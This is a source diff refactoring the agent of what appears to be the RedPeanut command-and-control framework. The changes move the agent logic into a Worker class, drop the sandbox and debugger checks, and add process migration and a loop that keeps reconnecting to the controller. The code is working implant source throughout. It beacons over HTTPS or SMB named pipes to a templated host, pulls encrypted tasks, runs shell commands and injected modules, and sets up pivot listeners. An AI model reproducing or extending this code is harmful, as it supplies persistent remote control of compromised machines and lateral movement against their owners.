@@ -6,60 +6,168 @@
 
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
-using System.Net;
-using System.Net.Security;
-using System.Threading;
 using System.IO.Pipes;
+using System.Net;
 using System.Net.NetworkInformation;
+using System.Net.Security;
+using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading;
+using System.Web.Script.Serialization;
 
 namespace RedPeanutAgent
 {
     public class Program
     {
-        public static string[] pageget = {
-           #PAGEGET#
-        };
-        public static string[] pagepost = {
-        	#PAGEPOST#
-        };
-
-        public static string param = "#PARAM#";
-        public static string serverkey = "#SERVERKEY#";
-        public static string host = "#HOST#";
-        public static int port = int.Parse("#PORT#");
-        public static string namedpipe = "#PIPENAME#";
-        public static string spawnp = "#SPAWN#";
-        public static bool isCovered = bool.Parse("#COVERED#");
-        public static bool injectionmanaged = bool.Parse("#MANAGED#");
-        public static string targetclass = "#TARGETCLASS#";
-
-        public static string nutclr = "#NUTCLR#";
 
         public static void Execute(string json, string cookie, NamedPipeClientStream pipe)
         {
-            if (containsSandboxArtifacts() || isBadMac() || isDebugged())
-                return;
+            Worker worker = new Worker(json, cookie, pipe);
+            worker.Run();
+        }
 
-            byte[] aeskey;
-            byte[] aesiv;
-            string agentid = "";
-            Thread servert = null;
-            bool smbstarted = false;
-            bool managed = injectionmanaged;
 
-            List<string> smblisteners = new List<string>();
+    }
 
-            Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();
+    public class Worker
+    {
+        public string[] pageget = {
+               #PAGEGET#
+            };
+        public string[] pagepost = {
+        	    #PAGEPOST#
+            };
 
+        public byte[] aeskey;
+        public byte[] aesiv;
+        public string agentid = "";
+
+        public string param = "#PARAM#";
+        public string serverkey = "#SERVERKEY#";
+        public string host = "#HOST#";
+        public int port = int.Parse("#PORT#");
+        public string namedpipe = "#PIPENAME#";
+        public string spawnp = "#SPAWN#";
+        public bool isCovered = bool.Parse("#COVERED#");
+        public bool injectionmanaged = bool.Parse("#MANAGED#");
+        public string targetclass = "#TARGETCLASS#";
+
+        public string nutclr = "#NUTCLR#";
+
+        public NamedPipeClientStream pipe;
+        public Core.Utility.CookiedWebClient wc;
+
+        public Dictionary<string, List<Core.Utility.TaskMsg>> commands = new Dictionary<string, List<Core.Utility.TaskMsg>>();
+
+        public Worker(string json, string cookie, NamedPipeClientStream pipe)
+        {
             Random r = new Random();
-
+            this.pipe = pipe;
             Core.Utility.AgentIdMsg agentidmsg = Core.Utility.GetAgentId(json);
             agentid = agentidmsg.agentid;
             aeskey = Convert.FromBase64String(agentidmsg.sessionkey);
             aesiv = Convert.FromBase64String(agentidmsg.sessioniv);
+            Console.WriteLine(agentidmsg.sessionkey);
+            Console.WriteLine(agentidmsg.sessioniv);
+            this.wc = CreateWebClient(cookie, host);
 
+            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
+
+            if (this.pipe != null)
+            {
+                Core.Utility.SendCheckinSMB(agentid, aeskey, aesiv, this.pipe);
+            }
+            else
+            {
+                Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
+            }
+        }
+
+        public Worker()
+        {
+            
+        }
+
+        public void LoadAndRun(string[] arguments)
+        {
+            string json = Encoding.Default.GetString(Convert.FromBase64String(arguments[0]));
+            Core.Utility.AgentState agentState = new JavaScriptSerializer().Deserialize<Core.Utility.AgentState>(json);
+            Random r = new Random();
+
+            agentid = agentState.Agentid;
+            aeskey = Convert.FromBase64String(agentState.sessionkey);
+            aesiv = Convert.FromBase64String(agentState.sessioniv);
+
+            if (agentState.pipename != null)
+            {
+                //Crete pipe client
+                this.pipe = CreatePipeClient(agentState.pipename);
+            }
+            else
+            {
+                this.wc = CreateWebClient(agentState.cookie, host);
+            }
+
+            //Send response message to task request sent to preceding process
+            //Need to create a dirty Task cause Instanceid need to be set
+            Core.Utility.TaskMsg task = new Core.Utility.TaskMsg();
+            task.Instanceid = agentState.RequestInstanceid;
+            Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, this);
+
+            string output = string.Format("[*] Agent successfully migrated to {0}", Process.GetCurrentProcess().ProcessName);
+
+            commandOutuput.SendResponse(output);
+
+            Run();
+        }
+
+        private void Reconnect(string agentid, byte[] aeskey, byte[] aesiv, string param, Core.Utility.CookiedWebClient wc)
+        {
+            bool connected = false;
+            while(!connected)
+            {
+                try
+                {
+                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
+
+                    if (this.pipe == null)
+                    {
+                        Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
+                        connected = true;
+                    }
+                }
+                catch (Exception)
+                {
+                    
+                }
+                //More delay here?
+                int rInt = GetDelay();
+                Thread.Sleep(rInt * 1000);
+            }
+
+            
+        }
+
+        private NamedPipeClientStream CreatePipeClient(string pipename)
+        {
+            NamedPipeClientStream pipe;
+            try
+            {
+                pipe = new NamedPipeClientStream(host, pipename, PipeDirection.InOut, PipeOptions.Asynchronous);
+                pipe.Connect(5000);
+                pipe.ReadMode = PipeTransmissionMode.Message;
+                return pipe;
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+
+        private Core.Utility.CookiedWebClient CreateWebClient(string cookie, string host)
+        {
             Core.Utility.CookiedWebClient wc = new Core.Utility.CookiedWebClient();
 
             WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
@@ -79,37 +187,44 @@ namespace RedPeanutAgent
                 );
 
             string[] hhosts = webHeaderCollection.GetValues("Host");
-            if(hhosts != null)
+            if (hhosts != null)
             {
                 foreach (string s in webHeaderCollection.GetValues("Host"))
                     wc.Add(new Cookie("sessionid", cookie, "/", s));
             }
-            
 
             wc.Add(new Cookie("sessionid", cookie, "/", host));
 
-            string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
+            return wc;
+        }
 
-            if (pipe != null)
-            {
-                Core.Utility.SendCheckinSMB(agentid, aeskey, aesiv, pipe);
-            }
-            else
-            {
-                Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
-            }
-
+        public int GetDelay()
+        {
+            Random r = new Random();
             //TODO manage max delay via config
             int maxdelay = 8;
-            int rInt = r.Next(5, maxdelay);
+            return r.Next(5, maxdelay);
+        }
+
+        public void Run()
+        {
+            List<string> smblisteners = new List<string>();
+
+            Random r = new Random();
+            int rInt = GetDelay();
+
+
+            Thread servert = null;
+            bool smbstarted = false;
+            bool managed = injectionmanaged;
 
             while (true)
             {
                 try
                 {
-                    rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pageget[new Random().Next(pageget.Length)]);
+                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pageget[r.Next(pageget.Length)]);
                     Core.Utility.TaskMsg task = null;
-                    
+
                     if (pipe != null)
                     {
                         task = Core.Utility.GetTaskSMB(aeskey, aesiv, pipe);
@@ -124,14 +239,14 @@ namespace RedPeanutAgent
                     {
                         if (task.Agentid.Equals(agentid))
                         {
-                            switch(task.TaskType)
+                            switch (task.TaskType)
                             {
                                 case "module":
                                     try
                                     {
-                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         Thread commandthread;
-                                        if(managed)
+                                        if (managed)
                                         {
                                             commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                         }
@@ -152,16 +267,16 @@ namespace RedPeanutAgent
                                     {
                                         try
                                         {
-                                            C2.SmbListener smblistener = new C2.SmbListener(agentid, serverkey, aeskey, aesiv, agentid, commands);
+                                            C2.SmbListener smblistener = new C2.SmbListener(agentid, agentid, this);
                                             servert = new Thread(new ThreadStart(smblistener.Execute));
                                             servert.Start();
                                             smbstarted = true;
-                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                             output = string.Format("[*] Pivot created. Pipe name {0}", agentid);
                                         }
                                         catch (Exception e)
                                         {
-                                            output = string.Format("[*] Crete pivot error: {0}", e.Message);
+                                            output = string.Format("[*] Create pivot error: {0}", e.Message);
                                         }
                                     }
                                     else
@@ -169,13 +284,13 @@ namespace RedPeanutAgent
                                         output = string.Format("[*] Pivot listener already exists");
                                     }
 
-                                    Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                    Execution.CommandExecuter commandOutuput = new Execution.CommandExecuter(task, this);
                                     commandOutuput.SendResponse(output);
                                     break;
                                 case "download":
                                     try
                                     {
-                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleManaged));
                                         commandthread.Start();
                                     }
@@ -187,8 +302,12 @@ namespace RedPeanutAgent
                                 case "standard":
                                     try
                                     {
-                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         commandExecuter.ExecuteModuleManaged();
+                                    }
+                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException e)
+                                    {
+                                        throw e;
                                     }
                                     catch (Exception)
                                     {
@@ -197,17 +316,29 @@ namespace RedPeanutAgent
                                     break;
                                 case "managed":
                                     managed = task.InjectionManagedTask.Managed;
+                                    Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
+                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", managed == true ? "Managed" : "Unmanaged"));
+                                    break;
+                                case "migrate":
+                                    try
                                     {
-                                        output = string.Format("[*] Pivot listener already exists");
+                                        Console.WriteLine(task.Instanceid);
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
+                                        commandExecuter.ExecuteModuleManaged();
                                     }
+                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
+                                    {
+                                        throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
+                                    }
+                                    catch (Exception)
+                                    {
 
-                                    Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
-                                    commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode",managed == true ? "Managed":"Unmanaged"));
+                                    }
                                     break;
                                 default:
                                     try
                                     {
-                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteCmd));
                                         commandthread.Start();
                                     }
@@ -233,7 +364,7 @@ namespace RedPeanutAgent
                                 }
                                 catch (Exception)
                                 {
-                                    
+
                                 }
                             }
                             else
@@ -243,7 +374,7 @@ namespace RedPeanutAgent
                         }
                     }
                 }
-                catch (RedPeanutAgent.Core.Utility.EndOfLifeException e)
+                catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
                 {
                     SystemException ex = new SystemException();
                     ex.Data["reason"] = "exit";
@@ -253,11 +384,11 @@ namespace RedPeanutAgent
                 {
                     HttpWebResponse errorResponse = e.Response as HttpWebResponse;
                     if (errorResponse == null || errorResponse.StatusCode != HttpStatusCode.NotFound)
-                        return;
+                        Reconnect(agentid, aeskey,  aesiv, param, wc);
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    return;
+                    Reconnect(agentid, aeskey, aesiv, param, wc);
                 }
 
                 Thread.Sleep(rInt * 1000);
